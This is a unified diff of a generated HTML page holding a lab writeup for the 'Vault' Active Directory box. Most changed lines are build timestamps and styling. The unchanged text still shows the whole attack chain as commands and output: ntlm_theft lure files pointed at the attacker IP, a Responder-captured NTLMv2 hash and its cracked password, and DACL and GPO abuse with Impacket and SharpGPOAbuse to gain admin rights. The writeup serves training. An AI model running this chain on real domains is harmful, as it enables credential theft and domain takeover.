@@ -3,7 +3,7 @@
   <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
     <meta charset="utf-8">
     <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
-    <meta name="generator" content="Hugo 0.154.5">
+    <meta name="generator" content="Hugo 0.161.1">
     <meta name="generator" content="Relearn 9.0.3+36307e4ed23582638ab689240ac7b427217803ee">
     <meta name="description" content="Vault writeup - Learn how to escalate privileges in an Active Directory environment by exploiting SMB guest write access and GPO abuse. This walkthrough covers NTLM hash capturing with Responder, ntlm-theft, and leveraging SharpGPOAbuse to gain local admin rights on a Windows Domain Controller.">
     <meta name="author" content="">
@@ -32,27 +32,28 @@
     <meta itemprop="wordCount" content="772">
     <meta itemprop="keywords" content="Responder,DACL,BloodHound,Ntlm_theft,SharpGPOAbuse,Impacket-Owneredit,Impacket-Dacledit">
     <title>Vault :: Zenu</title>
-    <link href="/images/favicon.png?1779778938" rel="icon" type="image/png">
-    <link href="/css/auto-complete/auto-complete.min.css?1779778938" rel="stylesheet">
-    <script src="/js/auto-complete/auto-complete.min.js?1779778938" defer></script>
-    <script src="/js/search-lunr.js?1779778938" defer></script>
-    <script src="/js/search.js?1779778938" defer></script>
+    <link href="/images/favicon.png?1784855724" rel="icon" type="image/png">
+    <link href="/images/favicon.ico?1784855724" rel="icon" type="image/x-icon" sizes="any">
+    <link href="/css/auto-complete/auto-complete.min.css?1784855724" rel="stylesheet">
+    <script src="/js/auto-complete/auto-complete.min.js?1784855724" defer></script>
+    <script src="/js/search-lunr.js?1784855724" defer></script>
+    <script src="/js/search.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
-      window.relearn.index_js_url="/searchindex.en.js?1779778938";
+      window.relearn.index_js_url="/searchindex.en.js?1784855724";
     </script>
-    <script src="/js/lunr/lunr.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.stemmer.support.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.multi.min.js?1779778938" defer></script>
-    <script src="/js/lunr/lunr.en.min.js?1779778938" defer></script>
+    <script src="/js/lunr/lunr.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.stemmer.support.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.multi.min.js?1784855724" defer></script>
+    <script src="/js/lunr/lunr.en.min.js?1784855724" defer></script>
     <script>
       window.relearn = window.relearn || {};
       window.relearn.contentLangs=['en'];
     </script>
-    <link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1779778938" rel="stylesheet"></noscript>
-    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1779778938" rel="stylesheet">
-    <link href="/css/theme.css?1779778938" rel="stylesheet">
-    <link href="/css/format-html.css?1779778938" rel="stylesheet" id="R-format-style">
+    <link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="/fonts/fontawesome/css/all.min.css?1784855724" rel="stylesheet"></noscript>
+    <link href="/css/perfect-scrollbar/perfect-scrollbar.min.css?1784855724" rel="stylesheet">
+    <link href="/css/theme.css?1784855724" rel="stylesheet">
+    <link href="/css/format-html.css?1784855724" rel="stylesheet" id="R-format-style">
     <script>
       window.relearn = window.relearn || {};
       // configuration
@@ -177,7 +178,7 @@
 
 <h1 id="initial-foothold">initial foothold<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="nmap">nmap<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
 </span></span><span style="display:flex;"><span>53/tcp    open  domain        Simple DNS Plus
 </span></span><span style="display:flex;"><span>88/tcp    open  kerberos-sec  Microsoft Windows Kerberos <span style="color:#f92672">(</span>server time: 2026-02-24 09:18:25Z<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
@@ -215,7 +216,7 @@
 <h1 id="enumeration">enumeration<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h1>
 <h2 id="smb">SMB<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
 <p>I checked that I have a guest access.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.115.172 -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>crackmapexec smb 192.168.115.172 -u <span style="color:#e6db74">&#39;guest&#39;</span> -p <span style="color:#e6db74">&#39;&#39;</span> --shares
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>SMB         192.168.115.172 <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows <span style="color:#ae81ff">10</span> / Server <span style="color:#ae81ff">2019</span> Build <span style="color:#ae81ff">17763</span> x64 <span style="color:#f92672">(</span>name:DC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:vault.offsec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:True<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>SMBv1:False<span style="color:#f92672">)</span>
 </span></span><span style="display:flex;"><span>SMB         192.168.115.172 <span style="color:#ae81ff">445</span>    DC               <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> vault.offsec<span style="color:#ae81ff">\g</span>uest: 
@@ -235,23 +236,23 @@
 <ol>
 <li>Craft the payload.</li>
 </ol>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ntlm_theft.py -g all -s 192.168.45.247 -f lure</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 ntlm_theft.py -g all -s 192.168.45.247 -f lure</span></span></code></pre></div>
 <ol start="2">
 <li>Start Responder</li>
 </ol>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0 -v</span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo responder -I tun0 -v</span></span></code></pre></div>
 <ol start="3">
 <li>Upload the files.</li>
 </ol>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prompt off
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>prompt off
 </span></span><span style="display:flex;"><span>mput *</span></span></code></pre></div>
 <p>Shortly after, a connection was triggered, and I captured the NTLMv2 hash for the user anirudh</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 192.168.115.172
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Client   : 192.168.115.172
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Username : VAULT<span style="color:#ae81ff">\a</span>nirudh
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>SMB<span style="color:#f92672">]</span> NTLMv2-SSP Hash     : anirudh::VAULT:40babecc932bb0e4:02EAF46724C05C5D92F5FA10E91CCC7D:010100000000000000715745BEA5DC0193C7B6FF64C22AFD00000000020008004C0039004100450001001E00570049004E002D004700310042003500520051003700440031003200380004003400570049004E002D00470031004200350052005100370044003100320038002E004C003900410045002E004C004F00430041004C00030014004C003900410045002E004C004F00430041004C00050014004C003900410045002E004C004F00430041004C000700080000715745BEA5DC01060004000200000008003000300000000000000001000000002000001830F0C706803F0173332094F5B2BB5FB0C4DAD79922348512363CC7DC51C8100A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003200340037000000000000000000</span></span></code></pre></div>
 <p>I cracked the captured hash and retrieved the password: SecureHM</p>
 <p>With these credentials, I gained initial access via evil-winrm:</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 192.168.115.172 -u <span style="color:#e6db74">&#39;anirudh&#39;</span> -p <span style="color:#e6db74">&#39;SecureHM&#39;</span></span></span></code></pre></div>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm -i 192.168.115.172 -u <span style="color:#e6db74">&#39;anirudh&#39;</span> -p <span style="color:#e6db74">&#39;SecureHM&#39;</span></span></span></code></pre></div>
 
 <details open class="box cstyle notices note">
   <summary class="box-label" tabindex="-1">
@@ -262,7 +263,7 @@
 <p>You can also do this manually by creating a .url file that points to your attacker IP.</p>
   </div>
 </details>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat @hax.url 
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat @hax.url 
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>InternetShortcut<span style="color:#f92672">]</span>
 </span></span><span style="display:flex;"><span>URL<span style="color:#f92672">=</span>anything
 </span></span><span style="display:flex;"><span>WorkingDirectory<span style="color:#f92672">=</span>anything
@@ -272,11 +273,11 @@
 <p>Running <code>whoami /priv</code> showed that the user has <strong>SeBackupPrivilege</strong>. However, after some investigation, this turned out to be a rabbit hole.</p>
 <p>I spent some time on it.</p>
 <h2 id="gpo-abuse-via-bloodhound">GPO Abuse via BloodHound<span class="btn cstyle anchor copyanchor scrollanchor link noborder notitle interactive"><button type="button" title="Copy link to clipboard"><i class="fa-fw fas fa-link fa-lg"></i></button></span></h2>
-<p><a href="#R-image-89bc310b16580e6291762b75cb323241" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-89bc310b16580e6291762b75cb323241"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
+<p><a href="#R-image-c6f873cd8d23b2f1557d591580c1fb43" class="lightbox-link"><img alt="bloodhound" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-bloodhound.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-c6f873cd8d23b2f1557d591580c1fb43"><img alt="bloodhound" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-bloodhound.png"></a></p>
 <p>Using BloodHound, I discovered that the user anirudh has write permissions over the Default Domain Policy.</p>
 <p>To escalate privileges, I took ownership of the GPO and modified the DACL using Impacket&rsquo;s owneredit and dacledit. Then, I used <strong>SharpGPOAbuse.exe</strong> to add anirudh to the local Administrators group.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-owneredit -action write -new-owner <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Current owner information below
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> - SID: S-1-5-21-537427935-490066102-1511301751-512
@@ -284,13 +285,13 @@
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> - distinguishedName: CN<span style="color:#f92672">=</span>Domain Admins,CN<span style="color:#f92672">=</span>Users,DC<span style="color:#f92672">=</span>vault,DC<span style="color:#f92672">=</span>offsec
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> OwnerSid modified successfully!</span></span></code></pre></div>
 <p>And give all privileges to the user.</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;WriteMembers&#39;</span> -principal <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span> -dc-ip 192.168.115.172
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-dacledit -action <span style="color:#e6db74">&#39;write&#39;</span> -rights <span style="color:#e6db74">&#39;WriteMembers&#39;</span> -principal <span style="color:#e6db74">&#39;anirudh&#39;</span> -target-dn <span style="color:#e6db74">&#39;CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=POLICIES,CN=SYSTEM,DC=VAULT,DC=OFFSEC&#39;</span> <span style="color:#e6db74">&#39;vault&#39;</span>/<span style="color:#e6db74">&#39;anirudh&#39;</span>:<span style="color:#e6db74">&#39;SecureHM&#39;</span> -dc-ip 192.168.115.172
 </span></span><span style="display:flex;"><span>Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL backed up to dacledit-20260225-104610.bak
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> DACL modified successfully!</span></span></code></pre></div>
-<p><a href="#R-image-1366f2322ec5c1530a7da5e3cbe2722f" class="lightbox-link"><img alt="GPO" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/valut-GPO.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-1366f2322ec5c1530a7da5e3cbe2722f"><img alt="GPO" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/valut-GPO.png"></a></p>
+<p><a href="#R-image-05e38958a206a7101cf7ecf2174d541c" class="lightbox-link"><img alt="GPO" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/valut-GPO.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-05e38958a206a7101cf7ecf2174d541c"><img alt="GPO" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/valut-GPO.png"></a></p>
 <p>The user anirudh is owner of default domain policy.</p>
 <p>With Powerview, we can confirm the user has permissions on it.</p>
 <div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0"><code class="language-hash" data-lang="hash">*Evil-WinRM* PS C:\Users\anirudh&gt; Get-GPPermission -Guid 31b2f340-016d-11d2-945f-00c04fb984f9 -TargetType User -TargetName anirudh
@@ -301,7 +302,7 @@ TrusteeType : User
 Permission  : GpoEditDeleteModifySecurity
 Inherited   : False</code></pre></div>
 <p>Now, let&rsquo;s modify the policy using <strong>SharpGPOAbuse.exe</strong>!</p>
-<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#ae81ff">\S</span>harpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName <span style="color:#e6db74">&#34;Default Domain Policy&#34;</span>
+<div class="highlight actionbar-wrapper wrap-code" dir="auto"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>.<span style="color:#ae81ff">\S</span>harpGPOAbuse.exe --AddLocalAdmin --UserAccount anirudh --GPOName <span style="color:#e6db74">&#34;Default Domain Policy&#34;</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain <span style="color:#f92672">=</span> vault.offsec
 </span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Domain Controller <span style="color:#f92672">=</span> DC.vault.offsec
@@ -317,8 +318,8 @@ Inherited   : False</code></pre></div>
 <p>Now anirudh became administrator!</p>
 <p>After successfully modifying the GPO, I forced a policy update.</p>
 <p><code>gpupdate /force</code></p>
-<p><a href="#R-image-ce1eab14b069fd453b365c1d56d2be73" class="lightbox-link"><img alt="whoami" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-admin.png" style="height: auto;width: auto;"></a>
-<a href="javascript:history.back();" class="lightbox-back" id="R-image-ce1eab14b069fd453b365c1d56d2be73"><img alt="whoami" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-admin.png"></a></p>
+<p><a href="#R-image-42e7c25081fb2e804ae897e9f02d7c49" class="lightbox-link"><img alt="whoami" class="lazy lightbox figure-image" loading="lazy" src="/images/vault/vault-admin.png" style="height: auto;width: auto;"></a>
+<a href="javascript:history.back();" class="lightbox-back" id="R-image-42e7c25081fb2e804ae897e9f02d7c49"><img alt="whoami" class="lazy lightbox lightbox-image" loading="lazy" src="/images/vault/vault-admin.png"></a></p>
 <p>With the policy applied, anirudh was added to the local Administrators group. I logged back in, verified my identity with whoami /groups, and successfully retrieved the root flag from the Administrator&rsquo;s desktop.</p>
 
   <footer class="footline">
@@ -423,8 +424,8 @@ Inherited   : False</code></pre></div>
 <div id="R-footer" class="default-animation"><p>Built with <a href="https://github.com/McShelby/hugo-theme-relearn" title="love"><i class="fas fa-heart"></i></a> by <a href="https://gohugo.io/">Hugo</a></p></div>
       </div>
     </aside>
-    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1779778938" defer></script>
-    <script src="/js/theme.js?1779778938" defer></script>
+    <script src="/js/perfect-scrollbar/perfect-scrollbar.min.js?1784855724" defer></script>
+    <script src="/js/theme.js?1784855724" defer></script>
     <div id="toast-container" role="status" aria-live="polite" aria-atomic="false"></div>
   </body>
 </html>
